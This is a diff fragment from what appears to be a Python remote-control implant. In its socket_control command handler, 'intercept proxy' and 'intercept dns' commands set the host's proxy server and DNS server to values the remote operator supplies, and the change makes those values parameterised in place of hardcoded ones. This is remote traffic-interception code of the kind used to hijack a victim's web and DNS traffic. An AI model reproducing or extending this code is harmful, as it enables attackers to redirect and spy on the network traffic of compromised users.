@@ -85,12 +85,12 @@ def socket_control(host,port,buffer):
 						# 
 						elif (data.split()[0] == "intercept"):
 							if (data.split()[1] == "proxy"):
-								if (change_proxy("127.0.0.1:8080",0x00000001) == True):
+								if (change_proxy(data.split()[2],data.split()[3]) == True):
 									socket_server.send(encode("\nSuccessfully enabled proxy server\n"))
 								else:
 									socket_server.send(encode("\nError enabling proxy server\n"))
 							elif (data.split()[1] == "dns"):
-								if (change_dns("8.8.8.8") == True):
+								if (change_dns(data.split()[2]) == True):
 									socket_server.send(encode("\nSuccessfully changed DNS server\n"))
 								else:
 									socket_server.send(encode("\nError while changing DNS server\n"))
